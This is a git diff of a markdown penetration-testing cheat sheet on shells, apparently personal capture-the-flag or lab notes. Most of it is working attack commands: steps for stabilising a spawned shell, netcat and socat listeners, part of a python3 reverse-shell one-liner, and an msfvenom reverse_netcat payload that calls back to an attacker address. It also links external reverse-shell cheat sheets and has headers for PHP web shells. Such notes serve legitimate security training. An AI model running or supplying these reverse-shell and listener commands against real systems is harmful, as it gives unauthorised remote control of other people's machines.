@@ -1,11 +1,26 @@
 # Shells
 
-## Upgrade shell
+## Stabilisation/Upgrade shell
+
+### Python
 
 ```console
+Step 1
 $ python -c 'import pty; pty.spawn("/bin/bash")'
+$ python2 -c 'import pty; pty.spawn("/bin/bash")'
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Step 2
+$export TERM=xterm
+
+Step 3
+STRG + Z to Backround shell
+$ stty raw -echo; fg
+
+Optional Setp 4:
+$ reset
 ```
+
 ## Web Shell PHP
 
 ### POC
@@ -59,6 +74,17 @@ If you are unsure whether they are enabled on your system, the following will re
 
 ## Reverse Shells
 
+[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+[PentestMonkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+### Listener
+
+```console
+nc -lvnp 9001
+
+socat TCP-L:<port>
+```
+
 ### Bash
 
 ```console
@@ -72,6 +98,8 @@ python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STRE
 ```
 
 ## msfvenom
+
+Payload Generator
 
 ```console
 $ msfvenom -p cmd/unix/reverse_netcat lhost=VPN-IP lport=1337 R
